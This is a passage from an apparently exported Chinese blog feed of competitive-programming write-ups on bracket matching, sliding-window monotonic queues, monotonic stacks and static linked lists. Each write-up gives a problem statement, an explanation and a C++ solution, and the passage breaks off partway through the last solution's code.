    <content><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>关于栈和队列我已经在上两篇日志里面讲过了，但是在实际应用中，往往都是混用的，而且OJ上P1148这道题还超级麻烦，所以……</p>
<p>看题：</p>
<h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>对于一个由(,),[,]括号组成的字符串，求出其中最长的括号匹配字串。 具体来说，满足如下条件的字符串成为括号匹配的字符串： （1）    (),[] 是括号匹配的字符串。 （2）    若A是括号匹配的串，则(A)或[A] 是括号匹配的字符串。 （3）    若A和B都是括号匹配的字符串，则A+B也是括号匹配的字符串。（这里的+是字符串的加法运算）。 例如：(),[],([]),()() 都是括号匹配的字符串，而][，[( ])，(]则不是。 字符串A的子串是指由A中连续若干个字符组成的字符串。例如：A,B,C,ABC,CAB,ABCCABC都是ABCABC的子串。空串是任何字符串的子串。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入一行，为一个仅由()[]组成的非空字符串。(括号都是英文输入法的括号)</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出也仅有一行，为最长的括号匹配子串。若有相同长度的子串，输出位置靠前的子串。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>拿到这道题，然后我们的思路就是建立一个类似于栈的队列，输入一个后和队列中上一个元素比较，如果出现 <code>[ )</code> 或者 <code>( ]</code> 的时候，是不合法的，直接让队尾end为零，如果合法的比如一直是<code>( ( [ [ [</code> 什么的，或者是 <code>( )  [ ]</code> 这种情况，那么是可以存进去的，如果匹配，那么就end-=2；然后将所有合法的 first 坐标和 last 坐标存进一个结构体数组里面，然后合并，合并完了之后不要想着什么直接输出，题目上说，如果出现 <code>([][][])[()]()</code> 这类情况也是可以的，所以我们就再次开一个循环，然后如果当前存储的last+1等于下一个的first，那么他们两个合在一起也是合法的，于是就合并啊，合并啊。</p>
<p><del>写了一百行的小弱鸡，大神六七十行搞定！</del></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> first;</span><br><span class="line">    <span class="keyword">int</span> last;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(note x,note y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x.first&lt;y.first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">yourcmp</span><span class="params">(note x,note y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x.last-x.first)&gt;(y.last-y.first);</span><br><span class="line">&#125;</span><br><span class="line">note Fans[<span class="number">1000001</span>],Lans[<span class="number">1000001</span>],Cans[<span class="number">1000001</span>];</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">list</span>[<span class="number">1000001</span>],ans=<span class="number">1</span>,num=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">string</span> s1,s2,s3;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s1;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> top=<span class="number">0</span>,end=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s1.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>[++end]=i;</span><br><span class="line">		<span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;)&#x27;</span>&amp;&amp;end==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			end=<span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;]&#x27;</span>&amp;&amp;end==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			end=<span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(end==<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;)&#x27;</span>&amp;&amp;s1[<span class="built_in">list</span>[end<span class="number">-1</span>]]==<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;]&#x27;</span>&amp;&amp;s1[<span class="built_in">list</span>[end<span class="number">-1</span>]]==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;)&#x27;</span>&amp;&amp;s1[<span class="built_in">list</span>[end<span class="number">-1</span>]]==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Fans[top].first=<span class="built_in">list</span>[end<span class="number">-1</span>];</span><br><span class="line">            Fans[top].last=<span class="built_in">list</span>[end];</span><br><span class="line">            end-=<span class="number">2</span>;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s1[<span class="built_in">list</span>[end]]==<span class="string">&#x27;]&#x27;</span>&amp;&amp;s1[<span class="built_in">list</span>[end<span class="number">-1</span>]]==<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Fans[top].first=<span class="built_in">list</span>[end<span class="number">-1</span>];</span><br><span class="line">            Fans[top].last=<span class="built_in">list</span>[end];</span><br><span class="line">            end-=<span class="number">2</span>;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(Fans,Fans+top,mycmp);</span><br><span class="line">    Lans[<span class="number">1</span>].first=Fans[<span class="number">1</span>].first;</span><br><span class="line">    Lans[<span class="number">1</span>].last=Fans[<span class="number">1</span>].last;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;top;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Fans[i].last&gt;Lans[ans].last)</span><br><span class="line">        &#123;</span><br><span class="line">			Lans[++ans].first=Fans[i].first;</span><br><span class="line">			Lans[ans].last=Fans[i].last;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Lans[i].last+<span class="number">1</span>==Lans[i+<span class="number">1</span>].first)</span><br><span class="line">        &#123;</span><br><span class="line">            Lans[i+<span class="number">1</span>].first=Lans[i].first;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            Cans[++num].first=Lans[i].first;</span><br><span class="line">            Cans[num].last=Lans[i].last;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(Cans+<span class="number">1</span>,Cans+num+<span class="number">1</span>,yourcmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Cans[<span class="number">1</span>].first;i&lt;=Cans[<span class="number">1</span>].last;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s1[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>单调队列FIFO+P1157window</title>
    <url>/2017/05/19/1c606ecfd617/</url>
    <content><![CDATA[<h2 id="单调队列描述"><a href="#单调队列描述" class="headerlink" title="单调队列描述"></a>单调队列描述</h2><p>于队列，就是一个数组，不过需要用head（我习惯用top）和tail（我习惯用end）来维护的一个先进后出的队列（有时候出入不规则）。单调队列就是在整个队列中，所有元素都是单调递增或者单调递减的，因为需要维护整个队列为单调的，所以有时候需要在队头或者队尾都删除数。</p>
<p>单调队列和单调栈是相似的，但是最优解的范围不同，队列在乎全局P1157，栈在乎局部P1153.</p>
<h2 id="题目P1157window"><a href="#题目P1157window" class="headerlink" title="题目P1157window"></a>题目P1157window</h2><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>给你一个长度为 N 的数组，一个长为 K 的滑动的窗体从最左移至最右端， 你只能见到窗口的K个数，每次窗体向右移动一位，如下表:</p>
</blockquote>
<blockquote>
<p><img src="https://xorex.space/image/010.jpg"></p>
</blockquote>
<blockquote>
<p>你的任务是找出窗口在各位置时的 max value,min value.</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>-第 1 行 n,k,<br>-第 2 行为长度为 n 的数组；</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>2 行 第 1 行每个位置的 min value,</p>
</blockquote>
<blockquote>
<p>第 2 行每个位置的 max value ；</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>拿到这道题，最简单的方法，n-k个sort，也就是说<code>(n-k)*nlogn</code> 次计算，如果n大一点，绝对超时，那么为了有更快的办法，我们可以直接使用单调队列来解决这个问题。因为题目中有min和max所以就需要两个不同的单调队列了，一个来存储递增的，另一个是递减的。</p>
<p>我们可以首先算出窗户最开始时的队列：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;k;i++)</span><br><span class="line">    &#123;<span class="comment">//建立单调队列，保证后面的元素都小于前面的</span></span><br><span class="line">        <span class="keyword">while</span>(a[i]&lt;e[end].v&amp;&amp;end&gt;=top)</span><br><span class="line">            end--;</span><br><span class="line">        e[++end].sit=i;</span><br><span class="line">        e[end].v=a[i];</span><br><span class="line">    &#125;<span class="comment">//每个元素都要进队</span></span><br></pre></td></tr></table></figure>
<p>这样利用<code>while(a[i]&lt;e[end].v&amp;&amp;end&gt;=top)</code>来比较元素，然后保证新进入的元素都是单调的，这样重复就好，然后再从k到n进行一次，和上面一样，不过需要多一个判断，判断top对头的元素有没有出去window的范围，如果出去了，就需要删除掉他。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>//结构体，用来存储队列里面的位置和权值</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> v;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> sit;</span><br><span class="line">&#125;;</span><br><span class="line">note e[<span class="number">1000001</span>],q[<span class="number">1000001</span>];<span class="comment">//开到全局里面大一点</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">1000001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n,k;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> top=<span class="number">1</span>,end=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    e[<span class="number">1</span>].v=a[<span class="number">1</span>];<span class="comment">//初始化一下队列</span></span><br><span class="line">    e[<span class="number">1</span>].sit=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;k;i++)</span><br><span class="line">    &#123;<span class="comment">//建立单调队列，保证后面的元素都小于前面的</span></span><br><span class="line">        <span class="keyword">while</span>(a[i]&lt;e[end].v&amp;&amp;end&gt;=top)</span><br><span class="line">            end--;</span><br><span class="line">        e[++end].sit=i;</span><br><span class="line">        e[end].v=a[i];</span><br><span class="line">    &#125;<span class="comment">//每个元素都要进队</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这里直接开始找</span></span><br><span class="line">       <span class="keyword">if</span>(i-e[top].sit==k) top++;<span class="comment">//如果top的坐标不在k的范围，删除</span></span><br><span class="line">       <span class="keyword">while</span>(a[i]&lt;e[end].v&amp;&amp;end&gt;=top)</span><br><span class="line">       end--;</span><br><span class="line">       e[++end].v=a[i];</span><br><span class="line">       e[end].sit=i;</span><br><span class="line">       <span class="built_in">cout</span>&lt;&lt;e[top].v&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//后面和前面是一样的，不过是判断相反而已</span></span><br><span class="line">    end=<span class="number">1</span>;</span><br><span class="line">    top=<span class="number">1</span>；</span><br><span class="line">    q[<span class="number">1</span>].v=a[<span class="number">1</span>];</span><br><span class="line">    q[<span class="number">1</span>].sit=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;q[end].v&amp;&amp;end&gt;=top)</span><br><span class="line">            end--;</span><br><span class="line">        q[++end].sit=i;</span><br><span class="line">        q[end].v=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i-q[top].sit==k) top++;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;q[end].v&amp;&amp;end&gt;=top)</span><br><span class="line">            end--;</span><br><span class="line">        q[++end].v=a[i];</span><br><span class="line">        q[end].sit=i;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;q[top].v&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>单调队列</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和单调栈+P1153乱头发节</title>
    <url>/2017/05/19/496922fd3c7f/</url>
    <content><![CDATA[<h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><blockquote>
<p>栈（stack）又名堆栈，它是一种运算受限的线性表。其限制是仅允许在表的一端进行插入和删除运算。这一端被称为栈顶，相对地，把另一端称为栈底。向一个栈插入新元素又称作进栈、入栈或压栈，它是把新元素放到栈顶元素的上面，使之成为新的栈顶元素；从一个栈删除元素又称作出栈或退栈，它是把栈顶元素删除掉，使其相邻的元素成为新的栈顶元素。</p>
</blockquote>
<h2 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h2><blockquote>
<p>栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针。</p>
</blockquote>
<h2 id="P1153乱头发节"><a href="#P1153乱头发节" class="headerlink" title="P1153乱头发节"></a>P1153乱头发节</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>李智宇的某 N 头奶牛 (1 &lt;= N &lt;= 80,000) 正在过乱头发节！由于每头牛都 意识到自己凌乱不堪的发型， 宁智贤希望统计出能够看到其他牛的头发的牛的数量。 每一头牛 i有一个高度 h[i] (1 &lt;= h[i] &lt;= 1,000,000,000)而且面向东方排成 一排(在我们的图中是向右)。因此，第i头牛可以看到她前面的那些牛的头， （即i+1, i+2,等等），只要那些牛的高度严格小于她的高度。</p>
</blockquote>
<blockquote>
<p><img src="https://xorex.space/image/009.jpg"></p>
</blockquote>
<blockquote>
<p>-牛#1 可以看到她们的发型 2, 3, 4</p>
</blockquote>
<blockquote>
<p>-牛#2 不能看到任何牛的发型</p>
</blockquote>
<blockquote>
<p>-牛#3 可以看到她的发型 4</p>
</blockquote>
<blockquote>
<p>-牛#4 不能看到任何牛的发型</p>
</blockquote>
<blockquote>
<p>-牛#5 可以看到她的发型 6</p>
</blockquote>
<blockquote>
<p>-牛#6 不能看到任何牛的发型!</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<ul>
<li>Line 1: 牛的数量 N。</li>
<li>Lines 2..N+1: 第 i+1 是一个整数，表示第i头牛的高度。</li>
</ul>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<ul>
<li>Line 1: 一个整数表示c[1] 至 c[N]的和.</li>
</ul>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>看到这道题，你是不是想到了神奇的枚举吗？一个二重循环，完美AC！！！等等，二重循环？O（n^2）? <strong>80000数据？</strong></p>
<p>是的，要超时。( <del>简直就是废话！</del>）</p>
<p>所以就需要用到一个超级高效的算法了，那就是利用<strong>单调栈！</strong></p>
<p>我们将元素单调存入栈中，如果当前元素大于等于栈顶，那么栈顶出栈，统计栈顶看到有多少头牛。如果栈为空，或当前元素比栈顶小，当前元素进栈。所以说，这个算法由于每个元素只会进入一次和出一次，所以是O（n）的。</p>
<p>至于怎么统计有多少头牛，你只需要看<strong>栈顶牛的位置和当前比栈顶大的牛的位置相差的数值减去看不到的当前牛</strong>就好。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">80001</span>]=&#123;<span class="number">0</span>&#125;,b[<span class="number">80001</span>],top=<span class="number">0</span>,n,in;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">if</span>(b[i]&gt;=b[a[top]]&amp;&amp;a[top]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=i-a[top]<span class="number">-1</span>;</span><br><span class="line">            a[top]=<span class="number">0</span>;</span><br><span class="line">            top--;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[top]==<span class="number">0</span>||b[i]&lt;b[a[top]])</span><br><span class="line">        &#123;</span><br><span class="line">            a[++top]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(top&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=n-a[top];</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>静态链表+P1145作弊的发牌者</title>
    <url>/2017/05/19/5ed3ff0481f6/</url>
    <content><![CDATA[<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>关于静态链表就是一个结构体，加上一个数组：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Card</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sit;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> prev;</span><br><span class="line">&#125;;Card a[<span class="number">1000</span>];</span><br></pre></td></tr></table></figure>
<h2 id="静态链表原理"><a href="#静态链表原理" class="headerlink" title="静态链表原理"></a>静态链表原理</h2><p>之所以会用到静态链表是因为纯粹的一位数组太慢了，每次处理差不多都是On(n),一个二重循环大多数数据都会超时的，包括移动一个元素，删除，插入一个元素能能，动一个就要动全身，所以要使用静态链表；</p>
<p>sit的具体含义是要分题目的，因为有些题中，要固定不变的量是不变的，有可能sit是一样需要移动的东西的编号，也有可能是一样东西的权值。next指的是这个东西下一个元素是哪一个，prev指的是上一个元素是哪一个，这样进行操作的时候就可以将为On(1)了。<br>eg:删除编号为15的元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[a[15].prev].next&#x3D;a[15].next</span><br></pre></td></tr></table></figure>
<p>这样我们只要让他的上一个元素所指向的下一个元素，为自己指向的下一个元素即可，然后就永远不会出现有个编号为15的元素了，因为其他没有任何一个元素的next是他，也就不可能访问到他了。</p>
<h2 id="P1145作弊的发牌者"><a href="#P1145作弊的发牌者" class="headerlink" title="P1145作弊的发牌者"></a>P1145作弊的发牌者</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>   贝茜正在与她的N-1(2 &lt;= N &lt;= 100)个朋友打牌。她们玩的牌一副为K (N &lt;= K &lt;= 100,000，K为N的倍数)张。所有牌中，一共有M(M = K / N)张“好 牌”，其余的K - M张为“差牌”。贝茜是游戏的发牌者，很自然地，她想把所 有好牌都留给自己。她热衷于获胜，即使为此必须采取一些不正当的手段。<br>在若干局游戏后，贝茜的朋友们开始怀疑贝茜在游戏中作弊，于是她们想了 个对策：使用新的发牌规则。规则具体如下：</p>
</blockquote>
<ol>
<li>贝茜把牌堆的最上面一张发给她右边的奶牛。</li>
<li>每当贝茜发完一张牌，她都得将牌堆顶部接下来的P(1 &lt;= P &lt;= 10)张牌 　　 放到底部去（一般把这个操作称为切牌）</li>
<li>然后，贝茜对逆时针方向的下一头奶牛重复上述的操作。</li>
</ol>
<blockquote>
<p>贝茜绝望地认为，她再也不可能获胜了，于是她找到了你，希望你告诉她， 将好牌放在初始牌堆的哪些位置，能够确保它们在发完牌后全集中到她手里。顺 带说明一下，我们把牌堆顶的牌定义为1号牌，从上往下第二张定义为2号牌，依此类推。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第1行: 3个用空格隔开的整数：N、K，以及P</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第1..M行: 每行输出一个正整数，表示贝茜应该在初始牌堆的这个位置放一张好牌。所有的位置按升序输出。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>看到这道题，大概想了想100000的数据，然后只能使用静态链表了。很简单，建一个机构体，然后删除一张牌的时候直接参考上面eg，然后洗牌（切牌）的时候，直接略过，让维护当前牌顶的ans直接等于接下来要操作的牌就好，然后用一个计数器，如果为总人数的倍数，记录下来删除的牌的sit值。</p>
<p>最后一个sort直接输出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Card</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sit;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line">Card a[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> player,num,wash;</span><br><span class="line">    <span class="keyword">int</span> er=num/player,ans=<span class="number">1</span>,j=<span class="number">0</span>,rem=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">100001</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;player&gt;&gt;num&gt;&gt;wash;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;num;i++)<span class="comment">//初始值</span></span><br><span class="line">    &#123;</span><br><span class="line">        a[i].sit=i;</span><br><span class="line">        a[i].next=i+<span class="number">1</span>;</span><br><span class="line">        a[i].prev=i<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a[num].sit=num;</span><br><span class="line">    a[num].next=<span class="number">1</span>;</span><br><span class="line">    a[num].prev=num<span class="number">-1</span>;</span><br><span class="line">    a[<span class="number">1</span>].prev=num;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        j++;</span><br><span class="line">        <span class="keyword">if</span>(j%player==<span class="number">0</span>) b[++rem]=a[ans].sit;<span class="comment">//判断是否为作弊者的牌</span></span><br><span class="line">        a[a[ans].prev].next=a[ans].next;</span><br><span class="line">        a[a[ans].next].prev=a[ans].prev;</span><br><span class="line">        